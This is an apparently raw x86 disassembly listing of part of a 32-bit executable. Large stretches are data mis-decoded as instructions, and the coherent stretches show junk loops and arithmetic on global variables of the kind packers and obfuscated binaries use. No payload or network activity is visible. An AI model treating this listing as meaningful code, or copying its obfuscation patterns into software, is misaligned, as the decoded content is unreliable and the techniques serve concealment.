  40730d:	sbb    al,0xf9
  40730f:	lods   al,BYTE PTR ds:[esi]
  407310:	push   eax
  407311:	pop    ebx
  407312:	into   
  407313:	cmp    eax,0xec7cbf05
  407318:	pusha  
  407319:	retf   
  40731a:	nop
  40731b:	out    0x26,eax
  40731d:	add    al,0x2
  40731f:	inc    edi
  407320:	cs inc esi
  407322:	ja     0x4072e9
  407324:	sub    eax,0xddb4fc70
  407329:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40732a:	ss push 0xffffffc9
  40732d:	cmc    
  40732e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40732f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407330:	push   edx
  407331:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407332:	push   cs
  407333:	stc    
  407334:	lods   eax,DWORD PTR ds:[esi]
  407335:	push   0xffffff98
  407337:	mov    edi,0xffe681cb
  40733c:	jge    0x4072c6
  40733e:	push   es
  40733f:	pop    ds
  407340:	clc    
  407341:	pushf  
  407342:	jmp    0x497d16c7
  407347:	popa   
  407348:	adc    DWORD PTR [edi],ecx
  40734a:	test   BYTE PTR [edi],ah
  40734c:	cld    
  40734d:	(bad)  
  40734e:	dec    ecx
  407350:	ret    0x4
  407353:	push   ebp
  407354:	mov    ebp,esp
  407356:	sub    esp,0x2c
  407359:	and    DWORD PTR ds:0x433657,0x5787
  407363:	mov    DWORD PTR [ebp-0x8],0xf89c8532
  40736a:	mov    eax,ds:0x43372b
  40736f:	or     DWORD PTR ds:0x43372f,eax
  407375:	jmp    0x40759d
  40737a:	pop    edx
  40737b:	cmp    al,0x59
  40737d:	inc    ebx
  40737e:	pop    ecx
  40737f:	arpl   WORD PTR [eax-0x1b],sp
  407382:	js     0x407389
  407384:	push   esi
  407385:	loope  0x4073c5
  407387:	imul   eax,DWORD PTR [edx+0x68],0x7e7ec20a
  40738e:	add    eax,0xca7e7e7c
  407393:	jp     0x407394
  407395:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407396:	pop    ds
  407397:	lods   eax,DWORD PTR ds:[esi]
  407398:	mov    eax,ds:0x8cdd71e2
  40739d:	ins    DWORD PTR es:[edi],dx
  40739e:	adc    esi,DWORD PTR [ebx]
  4073a0:	xchg   esi,eax
  4073a1:	test   ebx,ebx
  4073a3:	out    0xcc,al
  4073a5:	jle    0x407336
  4073a7:	mov    edx,0xdc11a014
  4073ac:	inc    esp
  4073ad:	test   BYTE PTR [eax+esi*2],dh
  4073b0:	adc    BYTE PTR [esp+ebx*1],cl
  4073b3:	pushf  
  4073b4:	call   0xdc428db8
  4073b9:	lahf   
  4073ba:	loop   0x407375
  4073bc:	out    0x5b,al
  4073be:	or     ch,al
  4073c0:	fadd   QWORD PTR [esi]
  4073c2:	push   edi
  4073c3:	xor    ebp,DWORD PTR [edi+0x1f9de859]
  4073c9:	lahf   
  4073ca:	jae    0x407405
  4073cc:	xchg   esi,eax
  4073cd:	sbb    eax,0x7476ca95
  4073d2:	cwde   
  4073d3:	mov    cl,BYTE PTR [ebp+eiz*1-0x63]
  4073d7:	inc    ecx
  4073d8:	jl     0x4073e2
  4073da:	cmp    BYTE PTR [edx+0xbeebec5],ch
  4073e0:	fwait
  4073e1:	push   ebp
  4073e2:	in     al,dx
  4073e3:	das    
  4073e4:	push   edx
  4073e5:	shl    BYTE PTR [eax+0x40b9c295],1
  4073eb:	outs   dx,BYTE PTR ds:[esi]
  4073ec:	xor    ah,bh
  4073ee:	stc    
  4073ef:	nop
  4073f0:	jae    0x407386
  4073f2:	lds    edi,FWORD PTR [ecx-0x45]
  4073f5:	retf   
  4073f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4073f7:	xchg   ebx,eax
  4073f8:	sub    eax,0x1f5a55d5
  4073fd:	mov    edx,0xbc336bcd
  407402:	push   ecx
  407403:	outs   dx,BYTE PTR ds:[esi]
  407404:	cmp    ebx,ebp
  407406:	pop    ebx
  407407:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407408:	call   0xc645f343
  40740d:	xor    ebp,DWORD PTR [ecx+0x39816569]
  407413:	(bad)  
  407414:	stc    
  407415:	or     edi,edx
  407417:	inc    ebp
  407418:	push   ebx
  407419:	xor    eax,0x2da7fa23
  40741e:	or     esi,ebp
  407420:	in     al,0xcb
  407422:	push   edi
  407423:	fstp   TBYTE PTR [ebp+0x27]
  407426:	test   dl,dh
  407428:	sbb    eax,0xc3bbf76d
  40742d:	popa   
  40742e:	add    eax,edi
  407430:	inc    ebp
  407431:	ror    DWORD PTR ds:0x225efde2,1
  407437:	or     al,0xad
  407439:	daa    
  40743a:	ja     0x407428
  40743c:	push   0xffffff8a
  40743e:	inc    edx
  40743f:	outs   dx,DWORD PTR ds:[esi]
  407440:	(bad)  
  407441:	pop    edx
  407442:	pushf  
  407443:	push   esi
  407444:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407445:	mov    esp,0x367e392d
  40744a:	scas   eax,DWORD PTR es:[edi]
  40744b:	ret    
  40744c:	adc    dh,BYTE PTR ds:0xdf9f967c
  407452:	icebp  
  407453:	or     al,0x75
  407455:	mov    eax,ds:0xbc84ef23
  40745a:	cdq    
  40745b:	mov    bh,BYTE PTR [ebp-0x46]
  40745e:	xor    ah,BYTE PTR [eax+0x3f]
  407461:	xor    eax,0x5181ad9c
  407466:	xor    al,0x7b
  407468:	in     eax,dx
  407469:	mov    al,ds:0x6fe9b556
  40746e:	cmp    DWORD PTR [edi+0x4f87dd8e],edi
  407474:	jbe    0x4074c7
  407476:	lea    esi,[eax-0x2b987341]
  40747c:	jne    0x407463
  40747e:	clc    
  40747f:	repnz adc eax,0x95c06c16
  407485:	into   
  407486:	loope  0x407416
  407488:	ins    DWORD PTR es:[edi],dx
  407489:	adc    ecx,DWORD PTR [edi]
  40748b:	jg     0x407460
  40748d:	add    BYTE PTR [ebx],ah
  40748f:	or     al,0xa4
  407491:	cmp    ebp,esp
  407493:	and    DWORD PTR [eax-0x5c],eax
  407496:	cdq    
  407497:	sub    al,0x66
  407499:	sub    DWORD PTR [edi+0x5e2753f6],esp
  40749f:	sub    al,0xd0
  4074a1:	ja     0x407438
  4074a3:	push   esp
  4074a4:	cmp    al,BYTE PTR [edx-0x48]
  4074a7:	jmp    0xc3cd9805
  4074ac:	dec    DWORD PTR [edi-0x6b2445ba]
  4074b2:	aaa    
  4074b3:	push   0xffffff8b
  4074b5:	ja     0x407520
  4074b7:	push   ecx
  4074b8:	stos   DWORD PTR es:[edi],eax
  4074b9:	push   ebx
  4074ba:	imul   BYTE PTR [edi+ebp*1-0x13]
  4074be:	mov    edi,0xcc6a3d5f
  4074c3:	xchg   DWORD PTR [edi],esp
  4074c5:	(bad)  
  4074c6:	call   0xe806:0xf3c5629
  4074cd:	mov    ds:0x62b4da4a,eax
  4074d2:	mov    WORD PTR [ecx-0x4cdcf0a7],?
  4074d8:	pop    ecx
  4074d9:	shr    dh,0xd
  4074dc:	push   esi
  4074dd:	mov    al,ds:0x5adc740a
  4074e2:	jecxz  0x4074b9
  4074e4:	inc    eax
  4074e5:	adc    BYTE PTR [edx-0x1075fcea],bh
  4074eb:	popf   
  4074ec:	mov    al,0x5f
  4074ee:	jl     0x40747c
  4074f0:	ss dec eax
  4074f2:	repz dec ebx
  4074f4:	cmp    BYTE PTR [edx-0x161c44da],dl
  4074fa:	sar    BYTE PTR [ebx+esi*2-0xb1b81af],cl
  407501:	fstp   DWORD PTR [edi]
  407503:	xor    dl,BYTE PTR [edx-0x5b]
  407506:	pop    ss
  407507:	jmp    0xb445c6e
  40750c:	cli    
  40750d:	xchg   ecx,eax
  40750e:	ror    BYTE PTR [edi+0x5ae357f4],1
  407514:	icebp  
  407515:	cli    
  407516:	lods   eax,DWORD PTR gs:[esi]
  407518:	call   0x6acafab
  40751d:	jbe    0x4074f6
  40751f:	cld    
  407520:	push   es
  407521:	or     eax,ebx
  407523:	mov    bl,BYTE PTR ds:0x93e309a
  407529:	(bad)  
  40752a:	lea    edx,[edx+0x64]
  40752d:	add    eax,0x20f54796
  407532:	mov    al,ds:0xd8c21f8a
  407537:	ror    DWORD PTR [eax],1
  407539:	inc    eax
  40753a:	imul   ecx,esi,0x47
  40753d:	xor    bl,BYTE PTR [ecx-0x33]
  407540:	dec    edx
  407541:	aad    0xa2
  407543:	es cmp eax,0x23f4f4bd
  407549:	jnp    0x4074ff
  40754b:	xchg   esp,eax
  40754c:	push   edx
  40754d:	inc    ebp
  40754e:	jns    0x407504
  407550:	call   0x6f88952f
  407555:	jno    0x40753f
  407557:	push   0x2d
  407559:	(bad)  
  40755a:	xchg   ecx,eax
  40755b:	ss sub al,0x46
  40755e:	and    esi,edx
  407560:	pop    eax
  407561:	xchg   BYTE PTR [ebp+0x16],al
  407564:	pop    ss
  407565:	mul    BYTE PTR [ebx-0x342bb281]
  40756b:	aad    0xd6
  40756d:	lds    esp,FWORD PTR [esi-0x75619bc3]
  407573:	mov    ah,0x55
  407575:	lods   eax,DWORD PTR ds:[esi]
  407576:	mov    bh,0x96
  407578:	xchg   ebx,eax
  407579:	mov    esp,0x63e671d0
  40757e:	add    dh,0x30
  407581:	dec    ecx
  407582:	inc    ebx
  407583:	or     ebp,ecx
  407585:	in     eax,0x56
  407587:	jb     0x40753e
  407589:	ret    
  40758a:	addr16 repz push es
  40758d:	mov    ecx,0xa4d1d347
  407592:	(bad)  
  407593:	xor    DWORD PTR [ecx-0x5a],eax
  407596:	dec    eax
  407597:	fldcw  WORD PTR [eax-0x23]
  40759a:	mov    WORD PTR [edx-0x13ba3811],ss
  4075a0:	xor    DWORD PTR [ebp+0x5135f89c],eax
  4075a6:	add    eax,0x77b80000
  4075ab:	xchg   ebp,eax
  4075ac:	add    BYTE PTR [eax],al
  4075ae:	mov    ecx,DWORD PTR ds:0x433653
  4075b4:	sub    DWORD PTR ds:0x43360f,ecx
  4075ba:	mov    WORD PTR [ebp-0x4],ax
  4075be:	and    ecx,0x22ab
  4075c4:	lea    eax,[ebp-0x24]
  4075c7:	sub    ecx,DWORD PTR ds:0x4335ff
  4075cd:	mov    DWORD PTR [ebp-0x28],eax
  4075d0:	mov    eax,DWORD PTR [ebp+0x8]
  4075d3:	and    DWORD PTR ds:0x43366b,0x78d4
  4075dd:	mov    DWORD PTR [ebp-0x20],eax
  4075e0:	and    DWORD PTR ds:0x43360f,0x0
  4075ea:	jmp    0x4075fc
  4075ef:	mov    ecx,DWORD PTR ds:0x43360f
  4075f5:	inc    ecx
  4075f6:	mov    DWORD PTR ds:0x43360f,ecx
  4075fc:	cmp    DWORD PTR ds:0x43360f,0x1c
  407603:	jae    0x40763a
  407609:	cmp    DWORD PTR ds:0x43360f,0x21
  407610:	jne    0x40762f
  407616:	push   DWORD PTR [ebp-0x18]
  407619:	push   0x26d9
  40761e:	push   DWORD PTR [ebp-0x1c]
  407621:	push   0x600b
  407626:	push   DWORD PTR [ebp-0x14]
  407629:	call   DWORD PTR ds:0x412348
  40762f:	jmp    0x4075ef
  407634:	xor    ecx,0x31bd
  40763a:	push   ebx
  40763b:	lea    eax,[ebp-0x18]
  40763e:	mov    DWORD PTR [ebp-0x1c],eax
  407641:	mov    eax,DWORD PTR [ebp-0x1c]
  407644:	jmp    0x40786c
  407649:	aad    0xb8
  40764b:	(bad)  
  40764c:	shl    BYTE PTR [ebx-0x20],0x75
  407650:	dec    ecx
  407651:	js     0x407697
  407653:	js     0x407668
  407655:	cmp    al,0x43
  407657:	xrelease xchg BYTE PTR [ecx],dl
  40765a:	sar    BYTE PTR [esi+0x7e],0x5
  40765e:	jl     0x4076de
  407660:	jle    0x407647
  407662:	lahf   
  407663:	mov    ecx,0x198b1127
  407668:	sub    al,0xf3
  40766a:	and    ebx,DWORD PTR [ebp-0x13]
  40766d:	test   dh,ch
  40766f:	sbb    eax,0xaebb4b25
  407674:	sahf   
  407675:	mov    ebx,0x762e1cb8
  40767a:	mov    bh,0x38
  40767c:	xor    al,0x72
  40767e:	jbe    0x4076e5
  407680:	aaa    
  407681:	cmp    eax,0xa6624864
  407686:	iret   
  407687:	pop    edx
  407688:	mov    ch,BYTE PTR [ecx+0x66]
  40768b:	sbb    BYTE PTR [esi],bl
  40768d:	mov    ds,WORD PTR [edi-0x5d4244ba]
  407693:	mov    DWORD PTR [edx-0x6a],esi
  407696:	jge    0x407708
  407698:	cmp    eax,DWORD PTR [ebx]
  40769a:	in     eax,dx
  40769b:	mov    ebx,0x86064d7e
  4076a0:	pop    ebx
  4076a1:	ret    
  4076a2:	pushf  
  4076a3:	pop    ss
  4076a4:	pop    ecx
  4076a5:	sbb    BYTE PTR [eax-0x29],0x7a
  4076a9:	sub    DWORD PTR ds:0xe63bc65c,ecx
  4076af:	jg     0x4076ec
  4076b1:	retf   
  4076b2:	das    
  4076b3:	mov    bh,0xde
  4076b5:	(bad)  
  4076b6:	bound  edx,QWORD PTR [ebp+0xa]
  4076b9:	cmp    esi,DWORD PTR [eax+edi*8]
  4076bc:	popf   
  4076bd:	xchg   edx,eax
  4076be:	adc    al,BYTE PTR [ebx+0x2a]
  4076c1:	jns    0x40765c
  4076c3:	sbb    eax,0x11fa7d64
  4076c8:	xor    BYTE PTR [eax+edx*4+0x44],cl
  4076cc:	out    0xbb,eax
  4076ce:	aaa    
  4076cf:	sub    bl,al
  4076d1:	test   esi,ecx
  4076d3:	jmp    0x7988:0xd9e61902
  4076da:	xchg   DWORD PTR [edx+edx*1-0x84a0ada],eax
  4076e1:	int    0xd5
  4076e3:	mov    esi,0xf3f5271
  4076e8:	dec    edi
  4076e9:	ja     0x4076b5
  4076eb:	mov    eax,ds:0xd6da40f4
  4076f0:	lahf   
  4076f1:	rcl    DWORD PTR [edx+0x74],cl
  4076f4:	pop    edx
  4076f6:	ficom  DWORD PTR [edi+0x4a]
  4076f9:	xlat   BYTE PTR ds:[ebx]
  4076fa:	ja     0x40767c
  4076fc:	popf   
  4076fd:	(bad)  
  4076fe:	xor    si,WORD PTR [esi-0x34]
  407702:	pop    eax
  407703:	fcom   DWORD PTR ds:0x915febb8
  407709:	enter  0x6462,0x5f
  40770d:	test   eax,0x293482a8
  407712:	lods   eax,DWORD PTR ds:[esi]
  407713:	nop
  407714:	mov    ds:0x82b42506,al
  407719:	ficom  DWORD PTR [edi]
  40771b:	jmp    0x4076df
  40771d:	fs push esp
  40771f:	imul   ecx,DWORD PTR [esi],0x1d1522e9
  407725:	fimul  DWORD PTR [ecx+eax*4-0xad2dce6]
  40772c:	bound  eax,QWORD PTR [edx-0x26d78955]
  407732:	mov    bl,0x62
  407734:	int    0x77
  407736:	rcr    BYTE PTR [edx-0x5586fb40],0x86
  40773d:	xor    DWORD PTR ds:0x9160ce05,0x31
  407744:	in     eax,0xe9
  407746:	jmp    0x40772e
  407748:	fucomi st,st(2)
  40774a:	jle    0x4077c0
  40774c:	jmp    0xdb44:0x81b1bba9
  407753:	inc    ebp
  407754:	pop    ds
  407755:	xchg   edi,eax
  407756:	mov    bl,0x74
  407758:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407759:	scas   al,BYTE PTR es:[edi]
  40775a:	ss aad 0xca
  40775d:	mov    ebx,0x7c8909f3
  407762:	test   al,0xb9
  407764:	sbb    ebp,0x77
  407767:	adc    DWORD PTR [ecx],0xffffffa2
  40776a:	in     eax,0xde
  40776c:	jl     0x407703
  40776e:	cwde   
  40776f:	mov    edi,fs
  407771:	jmp    0xc1d2:0x10069953
  407778:	iret   
  407779:	xor    dl,bl
  40777b:	pushf  
  40777c:	add    BYTE PTR [ebp-0x79443b60],dh
  407782:	test   eax,0xd590b18f
  407787:	sub    BYTE PTR [ecx],bl
  407789:	adc    DWORD PTR [edx],edx
  40778b:	nop
  40778c:	lods   eax,DWORD PTR ds:[esi]
  40778d:	xor    eax,0x6e6227d9
  407792:	out    0x29,al
  407794:	jmp    0x40775a
  407796:	sbb    BYTE PTR [di+0x143b],dh
  40779b:	stos   BYTE PTR es:[edi],al
  40779c:	(bad)  
  40779e:	sub    eax,0x6e863a37
  4077a3:	aad    0xef
  4077a5:	pop    ebx
  4077a6:	aas    
  4077a7:	retf   0xe6ce
  4077aa:	mov    WORD PTR [ebx-0x2f],es
  4077ad:	xor    al,BYTE PTR [edi+0x44f1b794]
  4077b3:	jo     0x407818
  4077b5:	cdq    
  4077b6:	push   esi
  4077b7:	sub    al,0x61
  4077ba:	mov    ch,0x7e
  4077bc:	sbb    ebx,0x70
  4077bf:	in     eax,0x0
  4077c1:	popf   
  4077c2:	loopne 0x40778a
  4077c4:	push   ebx
  4077c5:	add    al,0x68
  4077c7:	shl    BYTE PTR [ebx+0x30d59a88],cl
  4077cd:	mov    bh,0x10
  4077cf:	cmp    DWORD PTR [edi+0x7c3a4344],ecx
  4077d5:	inc    ebp
  4077d6:	(bad)  [edx+0x27207fd4]
  4077dc:	test   al,0xc4
  4077de:	ror    DWORD PTR [esi+0x12e3c0ff],cl
  4077e4:	pop    ecx
  4077e5:	cld    
  4077e6:	xchg   esp,eax
  4077e7:	cs or  al,0x51
  4077ea:	cmp    BYTE PTR [edx],cl
  4077ec:	dec    eax
  4077ed:	add    DWORD PTR [ebp+0xfbceae4],ebx
  4077f3:	call   0xdf4d405d
  4077f8:	or     BYTE PTR [eax+0x30b7108c],cl
  4077fe:	and    edi,DWORD PTR [esi-0x24a945c9]
  407804:	xor    DWORD PTR [edi+0x7f3d652c],ebp
  40780a:	clc    
  40780b:	leave  
  40780c:	add    al,0x27
  40780e:	xor    eax,0x6de8cd9
  407813:	xor    dl,al
  407815:	fild   DWORD PTR [edi-0x1]
  407818:	in     eax,0x6b
  40781a:	dec    edx
  40781b:	cld    
  40781c:	lea    ebp,[ecx]
  40781e:	enter  0x9faf,0x3e
  407822:	(bad)  
  407823:	outs   dx,DWORD PTR ds:[esi]
  407824:	retf   
  407825:	dec    eax
  407826:	cmp    bl,BYTE PTR [edx-0x3a]
  407829:	pop    ss
  40782a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40782b:	in     al,0x9b
  40782d:	mov    ds:0x10e985f8,al
  407832:	pusha  
  407833:	ja     0x4077c8
  407835:	sbb    eax,0xd62b4f9
  40783a:	xchg   ebx,eax
  40783b:	repnz imul eax,ebp,0x8fe2a53e
  407842:	sbb    al,BYTE PTR [edi]
  407844:	mov    ebp,DWORD PTR [eax+0x11]
  407847:	shr    BYTE PTR [edi+0x7e7d4233],0x3d
  40784e:	and    edx,DWORD PTR [edx+ebp*1-0x3b233977]
  407855:	xchg   edi,eax
  407856:	dec    ecx
  407857:	imul   eax,DWORD PTR [ebx],0x59
  40785a:	cmp    dh,bl
  40785c:	iret   
  40785d:	mov    bh,0x2a
  40785f:	in     al,0x41
  407861:	outs   dx,DWORD PTR ds:[esi]
  407862:	jbe    0x407855
  407864:	imul   esp,DWORD PTR [ebx],0x561a9955
  40786a:	stos   BYTE PTR es:[edi],al
  40786b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40786c:	push   esi
  40786d:	sub    ecx,esi
  40786f:	push   edi
  407870:	mov    edi,0xf89f2da9
  407875:	xor    DWORD PTR ds:0x4335ff,0x433663
  40787f:	mov    DWORD PTR [eax],edi
  407881:	mov    DWORD PTR ds:0x43371b,0x12
  40788b:	cmp    DWORD PTR ds:0x43371b,0x0
  407892:	je     0x4078c1
  407898:	cmp    DWORD PTR ds:0x43371b,0x14
  40789f:	jne    0x4078b1
  4078a5:	push   DWORD PTR [ebp-0x28]
  4078a8:	push   DWORD PTR [ebp-0x1c]
  4078ab:	call   DWORD PTR ds:0x41234c
  4078b1:	mov    eax,ds:0x43371b
  4078b6:	dec    eax
  4078b7:	mov    ds:0x43371b,eax
  4078bc:	jmp    0x40788b
  4078c1:	mov    eax,DWORD PTR [ebp-0x14]
  4078c4:	mov    ebx,DWORD PTR [ebp-0x8]
  4078c7:	and    DWORD PTR ds:0x43369f,0x0
  4078d1:	xor    esi,esi
  4078d3:	xor    esi,DWORD PTR ds:0x43369f
  4078d9:	inc    esi
  4078da:	mov    DWORD PTR ds:0x43369f,esi
  4078e0:	cmp    DWORD PTR ds:0x43369f,0x1c
  4078e7:	jne    0x4078f6
  4078ed:	push   DWORD PTR [ebp-0x28]
  4078f0:	call   DWORD PTR ds:0x4120d0
  4078f6:	cmp    DWORD PTR ds:0x43369f,0x18
  4078fd:	jb     0x4078d1
  407903:	xor    esi,0x6b5
  407909:	mov    ecx,0x7510854
  40790e:	neg    esi
  407910:	jmp    0x407b38
  407915:	loopne 0x4078c8
  407917:	test   DWORD PTR [edx+0x71f1b255],esi
  40791d:	cmp    dh,cl
  40791f:	pop    ebp
  407920:	out    0xc1,eax
  407922:	add    dl,BYTE PTR [ecx]
  407924:	loope  0x40794a
  407926:	into   
  407927:	jle    0x4079a7
  407929:	add    eax,0x177e7e7c
  40792e:	adc    DWORD PTR [eax],0x7f41df20
  407934:	xchg   BYTE PTR [ebx+0x0],dh
  407937:	cmp    ebx,edi
  407939:	inc    edx
  40793a:	call   0x20c0bc3e
  40793f:	cli    
  407940:	add    ebx,esp
  407942:	xor    ch,BYTE PTR [esi+0x36b89c55]
  407948:	aam    0x9d
  40794a:	sti    
  40794b:	mov    edi,0xd3b9eafe
  407950:	test   eax,0xd9a4a286
  407955:	mov    dh,0xee
  407957:	mov    cs,esi
  407959:	div    BYTE PTR [esi+esi*2]
  40795c:	ja     0x407973
  40795e:	add    cl,BYTE PTR [ebx-0x14]
  407961:	inc    esi
  407962:	fld    TBYTE PTR [ebx+ebp*8]
  407965:	nop
  407966:	jmp    0x407981
  407968:	clc    
  407969:	push   ecx
  40796a:	mov    bh,0x97
  40796c:	hlt    
  40796d:	aas    
  40796e:	lahf   
  40796f:	test   al,0x7f
  407971:	sub    edi,DWORD PTR [esi+0x48]
  407974:	pop    esp
  407975:	inc    eax
  407976:	sbb    edi,DWORD PTR [ebp-0x47bd7d63]
  40797c:	fst    DWORD PTR [edx+0x3e]
  40797f:	mov    ch,0xe3
  407981:	jl     0x407949
  407983:	jecxz  0x4079e1
  407985:	add    DWORD PTR [esi-0x4e],edx
  407988:	(bad)  
  407989:	adc    ebx,DWORD PTR [esi+edx*8-0x15]
  40798d:	repz push esp
  40798f:	rol    DWORD PTR [ecx],cl
  407991:	aas    
  407992:	push   edi
  407993:	jbe    0x40794a
  407995:	mov    dh,0xa6
  407997:	div    DWORD PTR [ebp-0x701495ed]
  40799d:	fdivp  st(4),st
  40799f:	outs   dx,DWORD PTR ds:[esi]
  4079a0:	stos   BYTE PTR es:[edi],al
  4079a1:	ficomp DWORD PTR [esi]
  4079a3:	jp     0x407a05
  4079a5:	push   ebx
  4079a6:	sbb    eax,0x450cb0e0
  4079ab:	ss into 
  4079ad:	retf   
  4079ae:	mov    DWORD PTR [edx-0x14],ecx
  4079b1:	mov    eax,ds:0x98f3dd73
  4079b6:	pop    ds
  4079b7:	mov    BYTE PTR [ecx-0xe],ah
  4079ba:	fwait
  4079bb:	(bad)  
  4079bc:	mov    esi,DWORD PTR [esi-0x34]
  4079bf:	jp     0x4079c1
  4079c1:	lods   al,BYTE PTR ds:[esi]
  4079c2:	cmp    esi,DWORD PTR [ecx+0x15]
  4079c5:	fsub   DWORD PTR [edi]
  4079c7:	push   0x1e
  4079c9:	xor    eax,0xb1884e91
  4079ce:	sbb    BYTE PTR [ebp+0x30f17299],bl
  4079d4:	mov    dl,0xf1
  4079d6:	sub    DWORD PTR [ebx-0x68002b2d],ecx
  4079dc:	pop    esi
  4079dd:	xchg   edx,eax
  4079de:	adc    eax,0x71792ac7
  4079e3:	jmp    0xaa613930
  4079e8:	loopne 0x407991
  4079ea:	sub    ch,BYTE PTR [ebx+0x4d271fec]
  4079f0:	stc    
  4079f1:	xchg   BYTE PTR [eax],cl
  4079f3:	cdq    
  4079f4:	pop    ss
  4079f5:	push   0xc41290e4
  4079fa:	lock loopne 0x407a5e
  4079fd:	shr    DWORD PTR [esi-0x1e650b92],0x46
  407a04:	adc    eax,0x22cd44a7
  407a09:	jg     0x407a30
  407a0b:	mov    dl,0xda
  407a0d:	inc    esp
  407a0e:	pop    ds
  407a0f:	les    ecx,FWORD PTR [eax+0x54f2b2db]
  407a15:	rcl    DWORD PTR [ebp-0x452c4f9f],cl
  407a1b:	test   dl,dl
  407a1d:	pushf  
  407a1e:	shr    BYTE PTR fs:[ebx-0x4c288772],0xce
  407a26:	shl    DWORD PTR [edi+0x13],1
  407a29:	pop    ebp
  407a2a:	(bad)  [edi-0x5ce2b4b]
  407a30:	sbb    BYTE PTR [esp+eiz*2+0x7272173f],dl
  407a37:	xlat   BYTE PTR ds:[ebx]
  407a38:	mov    eax,0x555dacc0
  407a3d:	xchg   DWORD PTR [esi],ebx
  407a3f:	les    eax,FWORD PTR [eax+ebx*2-0x2640855c]
  407a46:	in     eax,dx
  407a47:	adc    ebp,edx
  407a49:	mov    WORD PTR [ecx-0x5e150326],fs
  407a4f:	mov    esi,0x303382d5
  407a54:	fsubp  st(0),st
  407a56:	adc    al,0x4b
  407a58:	fcom   QWORD PTR [edi]
  407a5a:	sti    
  407a5b:	cmc    
  407a5c:	push   cs
  407a5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a5e:	sti    
  407a5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a60:	iret   
  407a61:	jns    0x407ace
  407a63:	je     0x407aa6
  407a65:	stos   BYTE PTR es:[edi],al
  407a66:	hlt    
  407a67:	pop    ebx
  407a68:	cmp    dl,ah
  407a6a:	push   ss
  407a6b:	cmp    DWORD PTR ds:0x944d9cc2,edi
  407a71:	mov    BYTE PTR [edi-0x3b],ch
  407a74:	cwde   
  407a75:	and    esi,DWORD PTR [ebp+0x77]
  407a78:	ins    BYTE PTR es:[edi],dx
  407a79:	bnd je 0x407ad9
  407a7c:	rcr    DWORD PTR [edx+0xfdfe783],0x8
  407a83:	lahf   
  407a84:	adc    ebp,DWORD PTR [ebp+ebx*8+0x1b54b25c]
  407a8b:	mov    ch,0xa8
  407a8d:	fld    TBYTE PTR [edx-0x5dc8a369]
  407a93:	jp     0x407a33
  407a95:	cs jecxz 0x407a30
  407a98:	mov    bh,0xca
  407a9a:	and    eax,0x2995790
  407a9f:	xor    edi,DWORD PTR [ebp+0x62]
  407aa2:	aas    
  407aa3:	dec    ebp
  407aa4:	xchg   ecx,eax
  407aa5:	cli    
  407aa6:	cmp    eax,0xfc7ff01f
  407aab:	xchg   esp,eax
  407aac:	adc    ebp,ebp
  407aae:	adc    al,BYTE PTR [eax-0x45]
  407ab1:	ror    DWORD PTR [ebx-0x1699b200],1
  407ab7:	xor    ch,BYTE PTR [ecx+0x76]
  407aba:	dec    esp
  407abb:	outs   dx,BYTE PTR ds:[esi]
  407abc:	out    0x81,al
  407abe:	shl    al,1
  407ac0:	pop    esi
  407ac1:	test   eax,0x90b700e7
  407ac6:	xchg   esp,eax
  407ac7:	add    BYTE PTR [ebx-0x3a],ah
  407aca:	test   al,0xba
  407acd:	cli    
  407ace:	les    edi,FWORD PTR [esi-0x23]
  407ad1:	inc    ecx
  407ad2:	xor    BYTE PTR [edx+0x7cfe6670],0x6a
  407ad9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ada:	mov    eax,0xa368768f
  407adf:	imul   eax,DWORD PTR [esp+ecx*8+0x26],0x71
  407ae4:	cmp    eax,DWORD PTR [ecx+0x64130ecf]
  407aea:	pop    edx
  407aeb:	push   ebx
  407aec:	sub    BYTE PTR [ecx+0x5c1e52cd],dh
  407af2:	lods   al,BYTE PTR ds:[esi]
  407af3:	retf   
  407af4:	jmp    0x8e5a9c66
  407af9:	pmullw mm0,QWORD PTR [edi-0x74b4b66e]
  407b00:	pop    ebx
  407b01:	clc    
  407b02:	repz jmp 0xf93c:0xeb6beafa
  407b0a:	jl     0x407ace
  407b0c:	adc    BYTE PTR [edx+ecx*4],bl
  407b0f:	outs   dx,BYTE PTR ds:[esi]
  407b10:	mov    dl,0xfc
  407b12:	cmp    eax,0x2c23948a
  407b17:	mov    cl,0xb8
  407b19:	test   ebp,ebx
  407b1b:	fidiv  DWORD PTR [ebp-0x1dd666a7]
  407b21:	sbb    eax,DWORD PTR [ebx+0x76]
  407b24:	std    
  407b25:	push   esi
  407b26:	jb     0x407aac
  407b28:	cld    
  407b29:	data16 in al,dx
  407b2b:	mov    eax,ds:0xf4dd4a85
  407b30:	fdiv   st(6),st
  407b32:	or     esi,edi
  407b34:	outs   dx,BYTE PTR ds:[esi]
  407b35:	cli    
  407b36:	push   cs
  407b37:	(bad)  
  407b38:	xor    eax,ecx
  407b3a:	adc    DWORD PTR ds:0x4336ab,0x1c6e
  407b44:	mov    esi,0x32729b
  407b49:	mov    DWORD PTR ds:0x433653,0x57a0
  407b53:	xor    ebx,ecx
  407b55:	add    DWORD PTR ds:0x433607,0x7d23
  407b5f:	xor    edx,edx
  407b61:	and    DWORD PTR ds:0x43372f,0x43360f
  407b6b:	add    eax,esi
  407b6d:	neg    DWORD PTR ds:0x43369f
  407b73:	add    ebx,esi
  407b75:	inc    DWORD PTR ds:0x433603
  407b7b:	div    ebx
  407b7d:	mov    edx,DWORD PTR [ebp-0x20]
  407b80:	mov    DWORD PTR ds:0x4336a7,0x7c8f
  407b8a:	mov    DWORD PTR [ebp-0x2c],0x4ec1
  407b91:	mov    DWORD PTR ds:0x43361f,0x3db9
  407b9b:	cmp    eax,DWORD PTR [edx]
  407b9d:	je     0x407f52
  407ba3:	mov    DWORD PTR ds:0x43366b,0x500e
  407bad:	mov    DWORD PTR [ebp-0xc],0x705fd8f
